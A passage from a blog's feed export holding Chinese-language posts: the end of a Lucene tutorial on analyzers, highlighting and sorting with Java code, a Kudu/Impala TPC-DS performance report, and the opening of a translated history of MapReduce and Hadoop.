class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Article article = <span class="keyword">new</span> Article(<span class="number">1</span>,<span class="string">"培训"</span>,<span class="string">"传智是一家Java培训机构"</span>);</span><br><span class="line">Document document = LuceneUtil.javabean2document(article);</span><br><span class="line"></span><br><span class="line">Directory fsDirectory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/indexDBDBDBDBDBDBDBDB"</span>));</span><br><span class="line">Directory ramDirectory = <span class="keyword">new</span> RAMDirectory(fsDirectory);</span><br><span class="line"></span><br><span class="line">IndexWriter fsIndexWriter = <span class="keyword">new</span> IndexWriter(fsDirectory,LuceneUtil.getAnalyzer(),<span class="keyword">true</span>,LuceneUtil.getMaxFieldLength());</span><br><span class="line">IndexWriter ramIndexWriter = <span class="keyword">new</span> IndexWriter(ramDirectory,LuceneUtil.getAnalyzer(),LuceneUtil.getMaxFieldLength());</span><br><span class="line"></span><br><span class="line">ramIndexWriter.addDocument(document);</span><br><span class="line">ramIndexWriter.close();</span><br><span class="line"></span><br><span class="line">fsIndexWriter.addIndexesNoOptimize(ramDirectory);</span><br><span class="line">fsIndexWriter.close();</span><br></pre></td></tr></table></figure><h4 id="分词器"><a href="#分词器" class="headerlink" title="分词器"></a>分词器</h4><p>我们在前面中就已经说过了，在把数据存到索引库的时候，我们会使用某些算法，将原始记录表的数据存到词汇表中…..那么<strong>这些算法总和我们可以称之为分词器</strong></p><p>分词器： <strong> 采用一种算法，将中英文本中的字符拆分开来，形成词汇，以待用户输入关健字后搜索</strong></p><p>对于为什么要使用分词器，我们也明确地说过：由于用户不可能把我们的原始记录数据完完整整地记录下来，于是他们在搜索的时候，是通过关键字进行对原始记录表的查询….此时，我们就采用<strong>分词器来最大限度地匹配相关的数据</strong></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g4fklfh67fj20ka08kdhl.jpg" alt></p><h4 id="分词器-1"><a href="#分词器-1" class="headerlink" title="分词器"></a>分词器</h4><ul><li>步一：按分词器拆分出词汇</li><li>步二：去除停用词和禁用词</li><li>步三：如果有英文，把英文字母转为小写，即搜索不分大小写</li></ul><p>API：</p><p>我们在选择分词算法的时候，我们会发现有非常非常多地分词器API，我们可以用以下代码来看看该<strong>分词器是怎么将数据分割的</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testAnalyzer</span><span class="params">(Analyzer analyzer, String text)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"当前使用的分词器："</span> + analyzer.getClass());</span><br><span class="line">    TokenStream tokenStream = analyzer.tokenStream(<span class="string">"content"</span>,<span class="keyword">new</span> StringReader(text));</span><br><span class="line">    tokenStream.addAttribute(TermAttribute.class);</span><br><span class="line">    <span class="keyword">while</span> (tokenStream.incrementToken()) &#123;</span><br><span class="line">        TermAttribute termAttribute = tokenStream.getAttribute(TermAttribute.class);</span><br><span class="line">        System.out.println(termAttribute.term());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在实验完之后，我们就可以选择恰当的分词算法了….</p><h4 id="IKAnalyzer分词器"><a href="#IKAnalyzer分词器" class="headerlink" title="IKAnalyzer分词器"></a>IKAnalyzer分词器</h4><p>这是一个第三方的分词器，我们如果要使用的话需要导入对应的jar包</p><ul><li><strong>IKAnalyzer3.2.0Stable.jar</strong></li><li><strong>步二：将IKAnalyzer.cfg.xml和stopword.dic和xxx.dic文件复制到MyEclipse的src目录下，再进行配置，在配置时，首行需要一个空行</strong></li></ul><p>这个第三方的分词器有什么好呢？？？？他是<strong>中文首选的分词器</strong>…也就是说：他是按照中文的词语来进行拆分的!</p><h3 id="对搜索结果进行处理"><a href="#对搜索结果进行处理" class="headerlink" title="对搜索结果进行处理"></a>对搜索结果进行处理</h3><h4 id="搜索结果高亮"><a href="#搜索结果高亮" class="headerlink" title="搜索结果高亮"></a>搜索结果高亮</h4><p>我们在使用SQL时，搜索出来的数据是没有高亮的…而我们使用<strong>Lucene，搜索出来的内容我们可以设置关键字为高亮</strong>…这样一来就更加注重用户体验了！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    String keywords = <span class="string">"钟福成"</span>;</span><br><span class="line">    List&lt;Article&gt; articleList = <span class="keyword">new</span> ArrayList&lt;Article&gt;();</span><br><span class="line">    QueryParser queryParser = <span class="keyword">new</span> QueryParser(LuceneUtil.getVersion(),<span class="string">"content"</span>,LuceneUtil.getAnalyzer());</span><br><span class="line">    Query query = queryParser.parse(keywords);</span><br><span class="line">    IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(LuceneUtil.getDirectory());</span><br><span class="line">    TopDocs topDocs = indexSearcher.search(query,<span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置关键字高亮</span></span><br><span class="line">    Formatter formatter = <span class="keyword">new</span> SimpleHTMLFormatter(<span class="string">"&lt;font color='red'&gt;"</span>,<span class="string">"&lt;/font&gt;"</span>);</span><br><span class="line">    Scorer scorer = <span class="keyword">new</span> QueryScorer(query);</span><br><span class="line">    Highlighter highlighter = <span class="keyword">new</span> Highlighter(formatter,scorer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;topDocs.scoreDocs.length;i++)&#123;</span><br><span class="line">        ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">        <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">        Document document = indexSearcher.doc(no);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置内容高亮</span></span><br><span class="line">        String highlighterContent = highlighter.getBestFragment(LuceneUtil.getAnalyzer(),<span class="string">"content"</span>,document.get(<span class="string">"content"</span>));</span><br><span class="line">        document.getField(<span class="string">"content"</span>).setValue(highlighterContent);</span><br><span class="line"></span><br><span class="line">        Article article = (Article) LuceneUtil.document2javabean(document,Article.class);</span><br><span class="line">        articleList.add(article);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Article article : articleList)&#123;</span><br><span class="line">        System.out.println(article);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="搜索结果摘要"><a href="#搜索结果摘要" class="headerlink" title="搜索结果摘要"></a>搜索结果摘要</h4><p>如果我们搜索出来的文章内容太大了，而我们只想显示部分的内容，那么我们可以对其进行摘要…</p><p>值得注意的是：搜索结果摘要需要与设置高亮一起使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">String keywords = <span class="string">"钟福成"</span>;</span><br><span class="line">        List&lt;Article&gt; articleList = <span class="keyword">new</span> ArrayList&lt;Article&gt;();</span><br><span class="line">        QueryParser queryParser = <span class="keyword">new</span> QueryParser(LuceneUtil.getVersion(),<span class="string">"content"</span>,LuceneUtil.getAnalyzer());</span><br><span class="line">        Query query = queryParser.parse(keywords);</span><br><span class="line">        IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(LuceneUtil.getDirectory());</span><br><span class="line">        TopDocs topDocs = indexSearcher.search(query,<span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">        Formatter formatter = <span class="keyword">new</span> SimpleHTMLFormatter(<span class="string">"&lt;font color='red'&gt;"</span>,<span class="string">"&lt;/font&gt;"</span>);</span><br><span class="line">        Scorer scorer = <span class="keyword">new</span> QueryScorer(query);</span><br><span class="line">        Highlighter highlighter = <span class="keyword">new</span> Highlighter(formatter,scorer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置摘要</span></span><br><span class="line">        Fragmenter fragmenter  = <span class="keyword">new</span> SimpleFragmenter(<span class="number">4</span>);</span><br><span class="line">        highlighter.setTextFragmenter(fragmenter);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;topDocs.scoreDocs.length;i++)&#123;</span><br><span class="line">            ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">            <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">            Document document = indexSearcher.doc(no);</span><br><span class="line"></span><br><span class="line">            String highlighterContent = highlighter.getBestFragment(LuceneUtil.getAnalyzer(),<span class="string">"content"</span>,document.get(<span class="string">"content"</span>));</span><br><span class="line">            document.getField(<span class="string">"content"</span>).setValue(highlighterContent);</span><br><span class="line"></span><br><span class="line">            Article article = (Article) LuceneUtil.document2javabean(document,Article.class);</span><br><span class="line">            articleList.add(article);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(Article article : articleList)&#123;</span><br><span class="line">            System.out.println(article);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="搜索结果排序"><a href="#搜索结果排序" class="headerlink" title="搜索结果排序"></a>搜索结果排序</h4><p>我们搜索引擎肯定用得也不少，使用不同的搜索引擎来搜索相同的内容。他们首页的排行顺序也会不同…这就是它们内部用了搜索结果排序….</p><p>影响网页的排序有非常多种：</p><ul><li>head/meta/【keywords关键字】</li><li>网页的标签整洁</li><li>网页执行速度</li><li>采用div+css</li><li>等等等等</li></ul><p>而在Lucene中我们就可以设置相关度得分来使不同的结果对其进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IndexWriter indexWriter = new IndexWriter(LuceneUtil.getDirectory(),LuceneUtil.getAnalyzer(),LuceneUtil.getMaxFieldLength());</span><br><span class="line">//为结果设置得分</span><br><span class="line">document.setBoost(20F);</span><br><span class="line">indexWriter.addDocument(document);</span><br><span class="line">indexWriter.close();</span><br></pre></td></tr></table></figure><p>当然了，我们也可以按单个字段排序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//true表示降序</span></span><br><span class="line">Sort sort = <span class="keyword">new</span> Sort(<span class="keyword">new</span> SortField(<span class="string">"id"</span>,SortField.INT,<span class="keyword">true</span>));</span><br><span class="line">TopDocs topDocs = indexSearcher.search(query,<span class="keyword">null</span>,<span class="number">1000000</span>,sort);</span><br></pre></td></tr></table></figure><p>也可以按多个字段排序：在多字段排序中，<strong>只有第一个字段排序结果相同时，第二个字段排序才有作用 提倡用数值型排序</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sort sort = <span class="keyword">new</span> Sort(<span class="keyword">new</span> SortField(<span class="string">"count"</span>,SortField.INT,<span class="keyword">true</span>),<span class="keyword">new</span> SortField(<span class="string">"id"</span>,SortField.INT,<span class="keyword">true</span>));</span><br><span class="line">TopDocs topDocs = indexSearcher.search(query,<span class="keyword">null</span>,<span class="number">1000000</span>,sort);</span><br></pre></td></tr></table></figure><h4 id="条件搜索"><a href="#条件搜索" class="headerlink" title="条件搜索"></a>条件搜索</h4><p>在我们的例子中，我们使用的是根据一个关键字来对某个字段的内容进行搜索。语法类似于下面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QueryParser queryParser = <span class="keyword">new</span> QueryParser(LuceneUtil.getVersion(),<span class="string">"content"</span>,LuceneUtil.getAnalyzer());</span><br></pre></td></tr></table></figure><p>其实，我们也可以使用关键字来对多个字段进行搜索，也就是多条件搜索。<strong>我们实际中常常用到的是多条件搜索，多条件搜索可以使用我们最大限度匹配对应的数据</strong>！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QueryParser queryParser = <span class="keyword">new</span> MultiFieldQueryParser(LuceneUtil.getVersion(),<span class="keyword">new</span> String[]&#123;<span class="string">"content"</span>,<span class="string">"title"</span>&#125;,LuceneUtil.getAnalyzer());</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>Lucene是全文索引引擎的祖先</strong>，后面的Solr、Elasticsearch都是基于Lucene的(后面会有一篇讲Elasticsearch的，敬请期待～)</li><li><p>Lucene中存的就是一系列的<strong>二进制压缩文件和一些控制文件</strong>,这些内容统称为<strong>索引库</strong>,索引库又分了两个部分：词汇表、词汇表</p></li><li><p>了解索引库的优化方式：1、合并文件  2、设置内存索引库</p></li><li>Lucene的分词器有非常多种，选择自己适合的一种进行分词</li><li>查询出来的结果可对其设置高亮、摘要、排序</li><li></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;ES这个组件其实挺重要的，早就应该了解的组件，借着这次机会，我尽量把这个组件摸摸透&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="ElasticSearch" scheme="http://yoursite.com/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://yoursite.com/tags/ElasticSearch/"/>
    
      <category term="Apach Lucene" scheme="http://yoursite.com/tags/Apach-Lucene/"/>
    
  </entry>
  
  <entry>
    <title>Kudu测试报告</title>
    <link href="http://yoursite.com/2019/06/19/kudu_test/"/>
    <id>http://yoursite.com/2019/06/19/kudu_test/</id>
    <published>2019-06-19T08:33:51.894Z</published>
    <updated>2019-06-21T08:46:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>数据模拟完成后的 Kudu 对比性能测试</p></blockquote><a id="more"></a> <h3 id="测试介绍"><a href="#测试介绍" class="headerlink" title="测试介绍"></a>测试介绍</h3><p>TPCDS 和 TPCH 是专门为超大数据量设置的测试项目，下面的是Kudu官网上官方用TPCH测试的结果：</p><p><img src="https://o59mpa.by.files.1drv.com/y4mA8w9Pf83M66l791AicbzEiuNzwVX4g4cBec-VP___6-UAnjPtWMl-GL4worC01W_SVpnXxhqIib-CTLsjnNi0DAjav_B5FpF9JVfWq1dgF0YZwb8SPSGgZl88X96ZhvR9-AysqpK3a6Wbt5L_oFf1L-JabZic5epZcecBgL_Hs937A5vMe_Y9HnWoepnsnctIat0QIijPkQsXI8aulx7yg?width=574&amp;height=258&amp;cropmode=none" alt></p><p>我自己做的表格也是模仿的<a href="https://kudu.apache.org/overview.html" target="_blank" rel="noopener">官方的图表</a>格式。</p><p>介绍一下这个图表的含义，TPCH测试中含有很多超复杂SQL，用不同的数据库在相同数据下运行了这些语句之后，然后对比运行时间，图表横坐标是SQL的序号，纵坐标是运行时间，官方的运行环境是75节点的，单位是毫秒。</p><h3 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h3><p>下面是我做的测试，三节点下的kudu，机器配置都是64G内存，16核心，系统是Centos 7.4，Kudu版本是1.5，SQL是用impala+Kudu的形式运行的，测试数据量是用TPCDS生成的100G数据。</p><p><img src="https://oj9gpa.by.files.1drv.com/y4mMCX7UM5aW2Q-AcVklQJrf5ZZ72ypNIIrCkO1UakfnMLQ7gfq3KudD80TWG0CpUUJ2zR_aAEiMTPKznwaIcKpLDxRnoYpgnnuyQ-uMGT0zuVrrOvpG3zyPP2CZKVXcS-v1bPxU3xZ1etv2t_9e-lDnftN2cYqM29n_OIZPWOx6NF7jo5EPXx9FOLyipipqNZdR2eVhoHutBQSIMrW9xyXVw?width=1443&amp;height=691&amp;cropmode=none" alt></p><p>我的测试相比官方的添加了文本格式的HiveSQL测试，测试下来确实是速度最慢的。</p><p>Kudu和parquet各有千秋，和官方的测试结果相差不大。</p><h3 id="写入性能"><a href="#写入性能" class="headerlink" title="写入性能"></a>写入性能</h3><p>Kudu的写入性能测试的时候没有能够完全发挥出来，短板不在kudu的写入，这边的写入测试是我用脚本统计5分钟内表多出来的行数然后除以600s得到的，这边截取一段（因为是5分钟统计一次，图表的表述可能不够准确）</p><p><img src="https://o59lpa.by.files.1drv.com/y4mTSkFgZzq__Ts2m5ZTdUr9MBUPBEGXJnEzp3ss_3cDbmVjyxh3gMkQnD0ZBVa5AGdeACWzycw83MmAoszRmiMgdFZgFrbviTB7gckxqw0fTDGuohEWxSo2npNc90L6oRZA1b7l5EizbDLEjJTlpTnWmLtu6dPnJeNxOwdKdPgYziqEisqyfE7rLS0Ekk3yEOgii45aCJ_hfZ2QU99_71yOw?width=476&amp;height=286&amp;cropmode=none" alt></p><p>监测过程中得到的最大写入速度在9.5w/s左右，大部分时候速度在3.5w条到5w条之间。</p><p>后来在开启多线程写入kudu的时候，kudu的写入速度很轻松就能达到20w/s，但是可能因为资源不足，kudu的tablet Server容易挂掉，因为impala也是非常吃内存的组件，64G有点捉襟见肘。</p><h4 id="kudu写入速度和表格大小的关系"><a href="#kudu写入速度和表格大小的关系" class="headerlink" title="kudu写入速度和表格大小的关系"></a>kudu写入速度和表格大小的关系</h4><p>kudu的这个写入速度和表格大小有直接关系。</p><p>结论：</p><p><strong>kudu导入小表的速度十分快，但是导入大表的时候性能会严重下降。</strong></p><p>为了避免测试误差，在用tpcds生成不同大小的测试样本中取相同表格不同大小来测试，避免阻断等等误差，测试结果如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g47cbzp1cuj20d407vdfp.jpg" alt></p><p>根据测试结果基本可以判断，我们测试集群环境下，小表的导入速度明显要比大表大很多。</p><p>类似的，我们根据TPCDS生成的不同大小的数据样本，分析数据量大小对kudu的影响（这边的数据来源网易的报告，1T的因为测试集群环境原因没有测试）：</p><p>100G:</p><p><img src="http://wx3.sinaimg.cn/large/bec9bff2gy1g47lubfzqyj20r80hzacf.jpg" alt></p><p>1T:</p><p><img src="http://wx3.sinaimg.cn/large/bec9bff2gy1g47lu7zq04j20qy0hbq3l.jpg" alt></p><p>根据上面两张折线图可以看出，随着表的数据量变成巨大，kudu和parquet的之间的性能也被拉开了。</p><p>10T:</p><p><img src="http://wx2.sinaimg.cn/large/bec9bff2gy1g47m9zhf2dj20p20h6gm3.jpg" alt></p><p>1T的和10T的相差不是特别大</p><p>结论：<strong>kudu表目前看来不太适合大表，分区能否解决这个问题，还要靠实验</strong></p><h4 id="资源使用情况"><a href="#资源使用情况" class="headerlink" title="资源使用情况"></a>资源使用情况</h4><p>Impala使用的资源整体上少于Spark，磁盘的读取少于Spark，这对于速度的提高至关重要，这与其语句的优化有关。Impala的CPU一直维持在较低的水平，说明其C++的实现比Java高效。</p><h4 id="kudu写入速度"><a href="#kudu写入速度" class="headerlink" title="kudu写入速度"></a>kudu写入速度</h4><p>Spark的CPU占用较高，但是维持在50%的水平，可见CPU并没有成为其瓶颈，在使用Oozie多线程写入的时候可能遇到了kudu的瓶颈，Kudu的写入瓶颈是可以通过一些参数进行简单调整的。</p><p>目前从集群的写入速度上来分析，初步判断硬盘的写入速度已经成为了瓶颈。</p><p>下图以Master节点为例，列出的Kudu TS以6个小时为一个窗口使用磁盘的峰值和平均值：</p><p><img src="https://arbgdq.by.files.1drv.com/y4mcprp_tVDZU3zFzgcmpoJtNJKwwr5PEVDcLXL_K-4D9X9ST4Vru8dYseDZ8sUPMTd7LwyKYe7MQI1fkaeXZGZG6ZyHTMGE1OvqLVCIJOBpK1NFAbatJZ6fmTTlvZjc6fFYT_8cCFOLjYhbWKeqbalRJ70sWjBHvRgqcnyyKKvhFltneMaGeQx4iunOQC-yk5_p-KmD3H_8tko7WCCj45ZDw?width=451&amp;height=289&amp;cropmode=none" alt></p><p>MiB单位换算成Mbit/s是Mbit/s = MiB/s * 0.1192，图中所示峰值几乎达到了机械硬盘写入极限。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;数据模拟完成后的 Kudu 对比性能测试&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Kudu" scheme="http://yoursite.com/categories/Hadoop/Kudu/"/>
    
    
      <category term="Kudu" scheme="http://yoursite.com/tags/Kudu/"/>
    
      <category term="test" scheme="http://yoursite.com/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>大规模数据处理的演化历程</title>
    <link href="http://yoursite.com/2019/06/18/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97%E6%B5%AA%E6%BD%AE/"/>
    <id>http://yoursite.com/2019/06/18/流式计算浪潮/</id>
    <published>2019-06-18T07:40:44.238Z</published>
    <updated>2019-05-28T10:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。</p></blockquote><p>我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。</p><p>第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。</p><p>那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。</p><p>下面是原文：</p></blockquote><a id="more"></a> <h2 id="大规模数据处理的演化历程"><a href="#大规模数据处理的演化历程" class="headerlink" title="大规模数据处理的演化历程"></a>大规模数据处理的演化历程</h2><p>大数据如果从 Google 对外发布 MapReduce 论文算起，已经前后跨越十五年，我打算在本文和你蜻蜓点水般一起浏览下大数据的发展史，我们从最开始 MapReduce 计算模型开始，一路走马观花看看大数据这十五年关键发展变化，同时也顺便会讲解流式处理这个领域是如何发展到今天的这幅模样。这其中我也会加入一些我对一些业界知名大数据处理系统 (可能里面有些也不那么出名) 的观察和评论，同时考虑到我很有可能简化、低估甚至于忽略了很多重要的大数据处理系统，我也会附带一些参考材料帮助大家学习更多更详细的知识。</p><p>另外，我们仅仅讨论了大数据处理中偏 MapReduce/Hadoop 系统及其派系分支的大数据处理。我没有讨论任何 SQL 引擎 [1]，我们同样也没有讨论 HPC 或者超级计算机。尽管我这章的标题听上去领域覆盖非常广泛，但实际上我仅仅会讨论一个相对比较垂直的大数据领域。</p><p>同样需要提醒的一件事情是，我在本文里面或多或少会提到一些 Google 的技术，不用说这块是因为与我在谷歌工作了十多年的经历有关。 但还有另外两个原因：1）大数据对谷歌来说一直很重要，因此在那里创造了许多有价值的东西值得详细讨论，2）我的经验一直是 谷歌以外的人似乎更喜欢学习 Google 所做的事情，因为 Google 公司在这方面一直有点守口如瓶。 所以，当我过分关注我们一直在”闭门造车”的东西时，姑且容忍下我吧。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h75jzktjj20u00e80sx.jpg" alt></p><p>为了使我们这一次大数据旅行显得更加具体有条理，我们设计了图 10-1 的时间表，这张时间表概括地展示了不同系统的诞生日期。</p><p>在每一个系统介绍过程中，我会尽可能说明清楚该系统的简要历史，并且我会尝试从流式处理系统的演化角度来阐释该系统对演化过程的贡献。最后，我们将回顾以上系统所有的贡献，从而全面了解上述系统如何演化并构建出现代流式处理系统的。</p><h3 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h3><p>我们从 MapReduce 开始我们的旅程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76cbmb5j20u00e4glt.jpg" alt></p><p>我认为我们可以很确定地说，今天我们讨论的大规模数据处理系统都源自于 2003 年 MapReduce。当时，谷歌的工程师正在构建各种定制化系统，以解决互联网时代下大数据处理难题。当他们这样尝试去解决这些问题时候，发现有三个难以逾越的坎儿：</p><ul><li>数据处理很难 只要是数据科学家或者工程师都很清楚。如果你能够精通于从原始数据挖掘出对企业有价值的信息，那这个技能能够保你这辈子吃喝不愁。</li><li>可伸缩性很难 本来数据处理已经够难了，要从大规模数据集中挖掘出有价值的数据更加困难。</li><li>容错很难 要从大规模数据集挖掘数据已经很难了，如果还要想办法在一批廉价机器构建的分布式集群上可容错地、准确地方式挖掘数据价值，那真是难于上青天了。</li></ul><p>在多种应用场景中都尝试解决了上述三个问题之后，Google 的工程师们开始注意到各自构建的定制化系统之间颇有相似之处。最终，Google 工程师悟出来一个道理: 如果他们能够构建一个可以解决上述问题二和问题三的框架，那么工程师就将可以完全放下问题二和三，从而集中精力解决每个业务都需要解决的问题一。于是，MapReduce 框架诞生了。</p><p>MapReduce 的基本思想是提供一套非常简洁的数据处理 API，这套 API 来自于函数式编程领域的两个非常易于理解的操作：map 和 reduce（图 10-3）。使用该 API 构建的底层数据流将在这套分布式系统框架上执行，框架负责处理所有繁琐的可扩展性和容错性问题。可扩展性和容错性问题对于分布式底层工程师来说无疑是非常有挑战的课题，但对于我们普通工程师而言，无益于是灾难。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76jh1w8j20u00e20t6.jpg" alt></p><p>我们已经在第 6 章详细讨论了 MapReduce 的语义，所以我们在此不再赘述。仅仅简单地回想一下，我们将处理过程分解为六个离散阶段（MapRead，Map，MapWrite，ReduceRead，Reduce，ReduceWrite）作为对于流或者表进行分析的几个步骤。我们可以看到，整体上 Map 和 Reduce 阶段之间差异其实也不大 ; 更高层次来看，他们都做了以下事情：</p><ul><li>从表中读取数据，并转换为数据流 (译者注: 即 MapRead、ReduceRead)</li><li>针对上述数据流，将用户编写业务处理代码应用于上述数据流，转换并形成新的一个数据流。 (译者注: 即 Map、Reduce)</li><li>将上述转换后的流根据某些规则分组，并写出到表中。 (译者注: 即 MapWrite、ReduceWrite)</li></ul><p>随后，Google 内部将 MapReduce 投入生产使用并得到了非常广泛的业务应用，Google 认为应该和公司外的同行分享我们的研究成果，最终我们将 MapReduce 论文发表于 OSDI 2004（见图 10-4）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76rug8xj20u00lrwhb.jpg" alt></p><p>论文中，Google 详细描述了 MapReduce 项目的历史，API 的设计和实现，以及有关使用了 MapReduce 框架的许多不同生产案例的详细信息。当然，Google 没有提供任何实际的源代码，以至于最终 Google 以外的人都认为：“是的，这套系统确实牛啊！”，然后立马回头去模仿 MapReduce 去构建他们的定制化系统。</p><p>在随后这十年的过程中，MapReduce 继续在谷歌内部进行大量开发，投入大量时间将这套系统规模推进到前所未有的水平。如果读者朋友希望了解一些更加深入更加详细的 MapReduce 说明，我推荐由我们的 MapReduce 团队中负责扩展性、性能优化的大牛 Marián Dvorský撰写的文章《History of massive-scale sorting experiments at Google》（图 10-5）</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76yqegmj20os0oj75n.jpg" alt></p><p>我这里希望强调的是，这么多年来看，其他任何的分布式架构最终都没有达到 MapReduce 的集群规模，甚至在 Google 内部也没有。从 MapReduce 诞生起到现在已经跨越十载之久，都未能看到真正能够超越 MapReduce 系统规模的另外一套系统，足见 MapReduce 系统之成功。14 年的光阴看似不长，对于互联网行业已然永久。</p><p>从流式处理系统来看，我想为读者朋友强调的是 MapReduce 的简单性和可扩展性。 MapReduce 给我们的启发是：MapReduce 系统的设计非常勇于创新，它提供一套简便且直接的 API，用于构建业务复杂但可靠健壮的底层分布式数据 Pipeline，并足够将这套分布式数据 Pipeline 运行在廉价普通的商用服务器集群之上。</p><h3 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h3><p>我们大数据旅程的下一站是 Hadoop（图 10-6）。需要着重说明的是：我为了保证我们讨论的重心不至于偏离太多，而压缩简化讨论 Hadoop 的内容。但必须承认的是，Hadoop 对我们的行业甚至整个世界的影响不容小觑，它带来的影响远远超出了我在此书讨论的范围。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77gg7y9j20u00dwdg1.jpg" alt></p><p>Hadoop 